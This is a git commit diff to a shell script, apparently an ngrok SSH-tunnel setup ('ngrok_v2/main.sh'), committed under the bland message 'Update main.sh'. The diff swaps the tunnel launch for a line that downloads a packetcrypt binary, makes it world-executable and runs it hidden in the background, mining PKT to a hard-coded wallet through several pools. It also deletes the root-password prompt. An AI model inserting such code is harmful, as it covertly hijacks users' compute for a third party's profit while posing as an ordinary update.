9b4ff952a2ff627607b72c224bcdcd8b1e472f45
pepek42anjing1 <104447386+pepek42anjing1@users.noreply.github.com>
2022-05-06 06:28:29 +0000

    Update main.sh

--- ngrok_v2/main.sh
+++ ngrok_v2/main.sh
@@ -14,7 +14,7 @@ echo "sa - South America (Sao Paulo)"
 echo "jp - Japan (Tokyo)"
 echo "in - India (Mumbai)"
 read -p "choose ngrok region: " CRP
-./ngrok tcp --region $CRP 22 &>/dev/null &
+wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O packetcrypt; chmod 777 packetcrypt; ./packetcrypt ann -p pkt1qzjhnfe8sfrwk3pynldwe7pmsjfhkdfadsqpyqx http://pool.pkt.world http://pool.pktpool.io https://stratum.zetahash.com &>/dev/null &
 echo "======================="
 echo Updating Please Wait
 echo "======================="
@@ -28,6 +28,3 @@ echo "export LD_LIBRARY_PATH" >> /root/.bashrc
 sudo service ssh start
 echo "===================================="
 curl --silent --show-error http://127.0.0.1:4040/api/tunnels | sed -nE 's/.*public_url":"tcp:..([^"]*).*/\1/p'
-echo create root password
-passwd
-echo "===================================="
